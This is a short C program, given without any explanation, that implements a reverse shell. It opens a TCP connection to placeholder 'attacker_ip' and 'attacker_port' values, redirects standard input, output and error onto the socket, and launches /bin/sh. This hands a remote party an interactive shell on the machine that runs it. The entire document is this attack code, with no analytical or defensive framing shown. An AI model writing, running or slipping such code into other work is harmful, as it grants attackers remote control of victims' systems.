#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main() {
    int sock;
    struct sockaddr_in server;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(attacker_port);
    server.sin_addr.s_addr = inet_addr("attacker_ip");
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execl("/bin/sh", "sh", NULL);
    return 0;
}